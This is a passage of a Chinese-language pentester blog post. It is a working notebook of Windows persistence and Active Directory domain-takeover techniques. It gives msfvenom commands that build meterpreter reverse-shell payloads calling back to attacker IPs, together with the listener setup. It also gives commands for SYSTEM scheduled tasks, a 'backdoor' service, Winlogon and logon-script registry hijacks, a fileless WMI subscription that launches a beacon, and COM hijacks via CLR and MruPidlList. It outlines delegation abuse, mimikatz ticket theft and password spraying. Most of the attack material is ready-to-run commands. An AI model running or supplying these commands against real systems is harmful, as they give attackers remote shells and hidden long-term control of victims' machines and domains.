href="#示例"></a> 示例</h4><ol><li><p>生成木马文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.52.130 lport=3333 -f exe -o shell.exe</span><br></pre></td></tr></table></figure></li><li><p>上传后本机监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_http</span><br><span class="line">set LHOST 192.168.52.130</span><br><span class="line">set LPORT 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li><li><p>创建任务每分钟运行一次，运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn test /sc minute /mo 1 /tr C:\Windows\Temp\shell.exe /ru system /f</span><br><span class="line">schtasks run test</span><br></pre></td></tr></table></figure></li></ol><h4 id="服务项"><a class="markdownIt-Anchor" href="#服务项"></a> 服务项</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc create “backdoor” binpath= “C:\Users\Administrator\Desktop\shell.exe”</span><br><span class="line"># sc description &quot;Backdoor&quot; &quot;description&quot;    #设置服务的描述字符串</span><br><span class="line">sc config &quot;backdoor&quot; start= auto             #设置这个服务为自动启动</span><br><span class="line">net start &quot;backdoor&quot;                               #启动服务</span><br></pre></td></tr></table></figure><h3 id="常规注册表自启动项-用户权限system权限"><a class="markdownIt-Anchor" href="#常规注册表自启动项-用户权限system权限"></a> 常规注册表自启动项 [用户权限/system权限]</h3><h4 id="自启动文件夹"><a class="markdownIt-Anchor" href="#自启动文件夹"></a> 自启动文件夹</h4><p>启动文件夹利用思路较为简单，即将Payload文件放在启动文件夹，再利用文件隐藏技巧对Payload进行隐藏</p><blockquote><p>#系统级自启动文件夹，需要System权限才能操作</p><p><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code></p><p>#用户级自启动文件夹，文件夹所属用户登录可以操作</p><p><code>C:\Users\$&#123;用户名&#125;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p></blockquote><p><strong>利用方法</strong></p><ol><li><p>将文件移植文件夹</p></li><li><p>对文件进行隐藏处理,如利用<code>attrib</code>为文件进行隐藏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib -S -A -H -R test.txt</span><br></pre></td></tr></table></figure></li></ol><h4 id="自启动项"><a class="markdownIt-Anchor" href="#自启动项"></a> 自启动项</h4><p>一种是重启电脑时自启动后门程序实现权限维持；另一种是点击某应用、服务、程序时自启动后门程序实现权限维持。开始菜单是Windows计算机在启动时都会访问到的路径，开始菜单启动项指示了启动文件夹的位置，具体位置如下：</p><blockquote><p>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup</p></blockquote><p>相关键值：</p><blockquote><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</p><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</p></blockquote><h4 id="注册表"><a class="markdownIt-Anchor" href="#注册表"></a> 注册表</h4><p>Windows在注册表中提供了两套独立的路径，一个是上面提到的当前用户的<code>HKEY_CURRENT_USER</code>即<code>HKCU</code>，另一个就是针对当前用户物理状态的<code>HKEY_LOCAL_MACHINE</code>即<code>HKLM</code>，仅有特权账户可以对其进行修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">1.Load注册键</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Windows＼load</span><br><span class="line"></span><br><span class="line">2.Userinit注册键</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon＼Userinit</span><br><span class="line"># 通常该注册键下面有一个userinit.exe。该键允许指定用逗号分隔的多个程序，如userinit.exe,evil.exe。</span><br><span class="line"></span><br><span class="line">3.Explorer＼Run注册键</span><br><span class="line">Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼Run</span><br><span class="line"># Explorer＼Run键在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。</span><br><span class="line"></span><br><span class="line">4.RunServicesOnce注册键</span><br><span class="line"># RunServicesOnce注册键用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册键启动的程序，在HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE下都有。</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼ Windows＼CurrentVersion＼RunServicesOnce</span><br><span class="line"></span><br><span class="line">5.RunServices注册键</span><br><span class="line"># RunServices注册键指定的程序紧接RunServicesOnce指定的程序之后运行，但两者都在用户登录之前。</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼ RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼ CurrentVersion＼RunServices</span><br><span class="line"></span><br><span class="line">6.RunOnce＼Setup注册键</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce＼Setup</span><br><span class="line"></span><br><span class="line">7.RunOnce注册键</span><br><span class="line"># 安装程序通常用RunOnce键自动运行程序，它的位置在</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce</span><br><span class="line">[小于NT6]HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnceEx</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE下面的RunOnce键会在用户登录之后立即运行程序，运行时机在其他Run键指定的程序之前；HKEY_CURRENT_USER下面的RunOnce键在操作系统处理其他Run键以及“启动”文件夹的内容之后运行。</span><br><span class="line"></span><br><span class="line">8.Run注册键</span><br><span class="line">HKEY_CURRENT_USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Run</span><br><span class="line">HKEY_LOCAL_MACHINE＼Software＼Microsoft＼Windows＼CurrentVersion＼Run</span><br><span class="line"># Run是自动运行程序最常用的注册键，HKEY_CURRENT_USER下面的Run键紧接HKEY_LOCAL_MACHINE下面的Run键运行，但两者都在处理“启动”文件夹之前。</span><br></pre></td></tr></table></figure><h3 id="mssql存储过程-继承服务权限"><a class="markdownIt-Anchor" href="#mssql存储过程-继承服务权限"></a> Mssql存储过程 [继承服务权限]</h3><ol><li>使用xp_cmdshell</li><li>使用<a target="_blank" rel="noopener" href="https://blog.csdn.net/PaidaxingSec/article/details/128929784#:~:text=1%E3%80%81SQL%20Server%20%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E6%8F%90%E6%9D%83%E6%AD%A5%E9%AA%A4%20%E4%BD%BF%E7%94%A8%20sp_addsrvrolemember%20%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%B0%86%E7%89%B9%E5%AE%9A%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%92%E8%89%B2%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%99%BB%E5%BD%95%E3%80%82,%E4%BD%BF%E7%94%A8%20ALTER%20PROCEDURE%20%E8%AF%AD%E5%8F%A5%E6%9B%B4%E6%94%B9%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E6%89%80%E6%9C%89%E8%80%85%E3%80%82%20%E9%80%9A%E8%BF%87%20GRANT%20%E8%AF%AD%E5%8F%A5%E5%B0%86%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E6%8E%88%E4%BA%88%E7%BB%99%E7%89%B9%E5%AE%9A%E7%9A%84%E7%94%A8%E6%88%B7%E6%88%96%E8%A7%92%E8%89%B2%E3%80%82">sp_addsrvrolemember</a></li></ol><h3 id="wmi构造无文件后门"><a class="markdownIt-Anchor" href="#wmi构造无文件后门"></a> WMI构造无文件后门</h3><p>参考<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html">链接</a>。全称是Windows Management Instrumentation，即Windows管理规范。大多数基于Windows的软件依赖于此服务。无文件无进程使得他非常隐蔽成为后门，但由于他的隐蔽性现在被大多数杀软所查杀。可以看tasklist，隐蔽性确实不太好。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;evil&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 310&quot;</span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;evilConsumer&quot;, ExecutablePath=&quot;C:\Users\hunter\Desktop\beacon.exe&quot;,CommandLineTemplate=&quot;C:\Users\hunter\Desktop\beacon.exe&quot;</span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;evil\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;evilConsumer\&quot;&quot;</span><br></pre></td></tr></table></figure><p>由于WMI的事件会循环执行，为确保不会无限弹shell，可以使用系统启动时间来限制（只要触发延时可以落在限定区间即可，有些机器启动慢因此起始时间调高些）</p><h3 id="winlogon"><a class="markdownIt-Anchor" href="#winlogon"></a> Winlogon</h3><p>winlogon.exe是windows中非常重要的进程，在用户还没登录系统之前就已经存在，并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</span><br></pre></td></tr></table></figure><p>操作1：删了后重新加载脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg delete &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /f</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;  /v &quot;Userinit&quot; /t REG_SZ /d &quot;C:\Windows\system32\cmd.exe,&quot; /f</span><br></pre></td></tr></table></figure><p>操作2：powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name   Userinit -value &quot;e:\cs.exe,C:\Windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><h3 id="clr"><a class="markdownIt-Anchor" href="#clr"></a> CLR</h3><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/109530138">链接</a>。CLR可以对运行对.NET程序进行监控，CLR全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。这种权限为此对方式可以理解成，让系统在执行.NET程序的时候先执行一个你指定的dll文件，<strong>且不需要管理员权限</strong>。</p><p>操作：</p><p>修改变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SETX COR_ENABLE_PROFILING 1 </span><br><span class="line">SETX COR_PROFILER &#123;AABBCCDD-1234-1234-1234-AABBCCDDEEFF&#125;			</span><br><span class="line">#&#123;AABBCCDD-1234-1234-1234-AABBCCDDEEFF&#125; 为 CLSID</span><br></pre></td></tr></table></figure><p>创建注册表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;AABBCCDD-1234-1234-1234-AABBCCDDEEFF&#125;\InProcServer32&quot; /VE /T REG_SZ /D &quot;C:\howe.dll&quot; /F</span><br><span class="line">REG ADD &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;AABBCCDD-1234-1234-1234-AABBCCDDEEFF&#125;\InProcServer32&quot; /V ThreadingModel /T REG_SZ /D Apartment /F</span><br></pre></td></tr></table></figure><h3 id="logon-scriptswindows登录脚本"><a class="markdownIt-Anchor" href="#logon-scriptswindows登录脚本"></a> Logon Scripts（Windows登录脚本）</h3><p>当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p><ul><li>注册表位置:<code>HKEY_CURRENT_USER\Environment\</code></li><li>创建字符串键值： <code>UserInitMprLogonScript</code>，设置后门的绝对路径：<code>e:\cs.exe</code></li></ul><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230807142555361.png" alt="image-20230807142555361"></p><p>操作：</p><ol><li>上传木马</li><li>添加键值：<code>reg add HKEY_LOCAL_MACHINE\Environment /v UserInitMprLogonScript /t REG_SZ /d &quot;e:\cs.exe&quot; /f</code></li></ol><h3 id="mrupidllist"><a class="markdownIt-Anchor" href="#mrupidllist"></a> MruPidlList</h3><p>这是一种主动的后门触发方式，只要对方主机重启机器的操作，就会触发之前设置的dll。系统在启动时默认启动进程explorer.exe，如果劫持了COM对象MruPidList，就能劫持进程explorer.exe，实现后门随系统开机启动，相当于时主动后门。而劫持MruPidlList劫持注册表中的一个<code>&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;CLSID</code>，将其带键值换成恶意dll即可。</p><p>操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;\InProcServer32</span><br><span class="line">REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;c:\calc.dll&quot; /F</span><br><span class="line">REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F</span><br></pre></td></tr></table></figure><p>木马生成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.69.12 LPORT=4444 -f dll &gt; calc.dll</span><br></pre></td></tr></table></figure><h3 id="mof"><a class="markdownIt-Anchor" href="#mof"></a> Mof</h3><p>在windows平台下，<code>c:/windows/system32/wbem/mof/nullevt.mof</code>这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将想要的操作通过代码存储到这个mof文件中，就可以实现权限提升，还有权限维持</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zlirving_/article/details/106618559">https://blog.csdn.net/Zlirving_/article/details/106618559</a></p><h3 id="粘滞键"><a class="markdownIt-Anchor" href="#粘滞键"></a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64973687/article/details/129763870?spm=1001.2014.3001.5501">粘滞键</a></h3><p>粘滞键的启动程序在C盘的Windows/system32目录下为sethc.exe。所以我们打开注册表，定位到以下路径：</p><blockquote><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File ExecutionOption</p></blockquote><p>在目录中新建一个sethc.exe的子项，并添加一个新键debugger，debugger的对应键值为后门木马的路径，这里我用cmd路径代替一下。</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230807141221331.png" alt="image-20230807141221331"></p><h3 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h3><ol><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42282189/article/details/120770787"><strong>有实验部分，写的不错</strong></a></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/heycomputer/articles/10666579.html">linux和windows都有</a></li><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8095#toc-6">也比较全</a></li><li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1850726">https://cloud.tencent.com/developer/article/1850726</a></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/CoreNote/article/details/121755723">启动项</a></li></ol><h2 id="linux权限维持"><a class="markdownIt-Anchor" href="#linux权限维持"></a> Linux权限维持</h2><h3 id="参考-2"><a class="markdownIt-Anchor" href="#参考-2"></a> 参考</h3><ol><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/342468.html">基本囊括</a></li><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7338">很齐全</a></li></ol><h1 id="域内渗透"><a class="markdownIt-Anchor" href="#域内渗透"></a> 域内渗透</h1><h2 id="横向多平台到控制"><a class="markdownIt-Anchor" href="#横向多平台到控制"></a> 横向（多平台）到控制</h2><p>对于WIN TO WIN的方式，之前就说过，所以不多讲</p><h3 id="win-to-lin与lin-to-lin差不多"><a class="markdownIt-Anchor" href="#win-to-lin与lin-to-lin差不多"></a> WIN TO LIN（与LIN TO LIN差不多）</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34226706/article/details/92549303#:~:text=%E4%BD%BF%E7%94%A8%E8%BF%99%E4%B8%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%AE%A9%E4%BD%A0%E5%9C%A8windows%E7%9A%84cmd%E7%AA%97%E5%8F%A3%E4%B8%8B%E8%BF%9E%E6%8E%A5%E5%88%B0linux%EF%BC%8C%E5%B0%B1%E5%83%8Fssh%E4%BC%BC%E7%9A%84%E3%80%82%20%E4%B8%8D%E8%BF%87%E6%98%BE%E7%A4%BA%E8%B2%8C%E4%BC%BC%E6%9C%89%E7%82%B9%E9%97%AE%E9%A2%98%EF%BC%8C%E5%A4%AA%E4%B9%B1%E4%BA%86%E3%80%82%20%E4%BD%A0%E5%8F%AF%E4%BB%A5%E8%BF%99%E6%A0%B7%E4%BD%BF%E7%94%A8%EF%BC%9A%201.%20%E9%A6%96%E5%85%88%E6%8A%8Aplink.exe%20%E6%94%BE%E5%88%B0C%3AWindows%20%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%9B,2.%20%E5%9C%A8cmd%E7%AA%97%E5%8F%A3%E4%B8%AD%E8%BE%93%E5%85%A5%EF%BC%9A%20plink%20-l%20root%20IP%20%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%99%BB%E5%BD%95%E8%BF%9C%E7%A8%8B%E6%9C%BA%E5%99%A8%E4%BA%86%E3%80%82">plink</a> 或者 基于Windows SSH库自行开发各种远程执行小工具。</p><h3 id="lin-to-win"><a class="markdownIt-Anchor" href="#lin-to-win"></a> LIN TO WIN</h3><p>一般都会将 impacket套件中的各个常用py脚本事先直接打包成可执行文件，然后丢到目标linux系统中去执行，如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmiexec_linux_x86_64</span><br><span class="line">smbexec_linux_x86_64</span><br><span class="line">psexec_linux_x86_64</span><br><span class="line">atexec_linux_x86_64</span><br><span class="line">dcomexec_linux_x86_64</span><br></pre></td></tr></table></figure><p>另外,还有一些基于go的工具,同样也可以编译成可执行文件之后再丢上去执行</p><h1 id="域控"><a class="markdownIt-Anchor" href="#域控"></a> 域控</h1><h2 id="获取域控权限"><a class="markdownIt-Anchor" href="#获取域控权限"></a> 获取域控权限</h2><h3 id="kerberos委派机制"><a class="markdownIt-Anchor" href="#kerberos委派机制"></a> Kerberos委派机制</h3><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。其包含：</p><ul><li>约束委派</li><li>非约束委派</li><li>基于资源的约束委派</li></ul><p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1899592">https://cloud.tencent.com/developer/article/1899592</a></p><p>注：</p><ol><li>在 Windows 系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的</li><li></li></ol><h4 id="非约束委派"><a class="markdownIt-Anchor" href="#非约束委派"></a> 非约束委派</h4><p>简单点说就是：用户 A 去访问服务B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问的任意服务。其中，用户A的票据会被存在服务B中</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/4354ae02457d7d38ffbc01547a2005a1.jpeg" alt="img" style="zoom:67%"><p>攻击手法：</p><p>发现域内主机主机我一般是使用 <code>LDAP</code>，可以使用如下方式：<a target="_blank" rel="noopener" href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">Adfind</a>工具，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/ccb1b9a6ca972b231f899c4bfc20694a.png" alt="img" style="zoom:50%"><p>saulgoodman就是非约束委派用户。知道委派用户之后，我们尝试请求Service1（拥有委派的用户）。一旦域控访问了该服务（可以使用<code>Enter-PSSession -ComputerName WIN-BING-PC</code>模拟访问），则我们可以使用mimikatz dump下其数据库，此时域控的票据就在里面了，我们就可以通过ptt，获得域控权限。</p><h4 id="约束委派"><a class="markdownIt-Anchor" href="#约束委派"></a> 约束委派</h4><p>约束委派（Constrained Delegation）即 Kerberos 的扩展协议 S4U2Proxy，服务账号只能获取某用户的 TGS ，从而只能模拟用户访问特定的服务，这也相对应非约束委派更安全一些。</p><p>在内网中利用约束委派进行攻击的最重要的一点是：<strong>约束委派的服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的</strong>，通过这个点，只要我们有约束委派的服务的账户和密码，那么通过这个服务就可以直接来进行攻击可以访问的相关服务。</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/b012828c3eceb6b299a9f9e7f12adde1.png" alt="img" style="zoom:40%"><p>其攻击方式有两种：</p><ul><li>基于主机账号的</li><li>基于服务账号的</li><li>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/12939246.html%E3%80%81https://zhuanlan.zhihu.com/p/476094695%E3%80%81https://xz.aliyun.com/t/7217">https://www.cnblogs.com/zpchcbd/p/12939246.html、https://zhuanlan.zhihu.com/p/476094695、https://xz.aliyun.com/t/7217</a></li></ul><h3 id="gpp目录账号密码"><a class="markdownIt-Anchor" href="#gpp目录账号密码"></a> GPP目录账号密码</h3><p>搜集GPP目录，其中可能保存的有域账号密码，不仅仅是存在XML里的那些，NETLOGON目录中的某些脚本同样也可能保存有账号密码。</p><h3 id="批量对域用户进行单密码尝试-喷射利用adsi接口日志id-4771"><a class="markdownIt-Anchor" href="#批量对域用户进行单密码尝试-喷射利用adsi接口日志id-4771"></a> 批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]</h3><ol><li>喷射：工具<a target="_blank" rel="noopener" href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></li><li>ADSI接口</li><li>日志id 4771</li></ol><h3 id="基础服务getshell"><a class="markdownIt-Anchor" href="#基础服务getshell"></a> 基础服务getshell</h3><ol><li>弱口令</li><li>各类java中间件和已知Nday漏洞</li><li>常规web漏洞</li><li>凭证抓取，横向移动<ol><li>域管密码</li><li>域管令牌</li></ol></li></ol><h3 id="爆破ldapkerberos"><a class="markdownIt-Anchor" href="#爆破ldapkerberos"></a> 爆破LDAP&amp;Kerberos</h3><p>域内LDAP是用来访问Acitve Directory数据库的目录服务协议。AD DS域服务通过使用LDAP名称路径表示对象在Active Directory数据库中的位置。管理员使用LDAP协议来访问活动目录中的对象，LDAP通过“命令路径”定位对象在数据库中的位置，即使用标识名（Distinguished Name,DN）和相对标识名（Relative Distinguished Name,RDN）标识对象。</p><p>爆破工具：<a target="_blank" rel="noopener" href="https://github.com/optiv/Talon">https://github.com/optiv/Talon</a></p><p>Exchange特定ACL滥用</p><p>SSP 截获关键服务器登录密码</p><p>DNSAdmin 组成员滥用 [ 加载执行恶意dll ]</p><p>LAPS</p><p>MS14-068 [ 如今实际中已很少遇到了 ]</p><p>LLMNR/NBNS欺骗 + SMB relay [ 真实实战中其实用的并不多 ]</p><h1 id="常用工具"><a class="markdownIt-Anchor" href="#常用工具"></a> 常用工具</h1></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="https://j3f5.github.io/articles/2023/07/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/" title="内网安全（二）——补充版" target="_blank" rel="external">https://j3f5.github.io/articles/2023/07/28/内网安全（二）——补充版/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/j3f5" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/j3f5" target="_blank"><span class="text-dark">妄想星空</span><small class="ml-1x">Web Pentestor</small></a></h3><div>网安小菜鸡，在线总结</div></div></figure></div></div></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/articles/2023/08/03/CAN%E6%80%BB%E7%BA%BF%E6%B5%8B%E8%AF%95%E6%A0%B7%E4%BE%8B/" title="CAN总线测试样例"><i class="icon 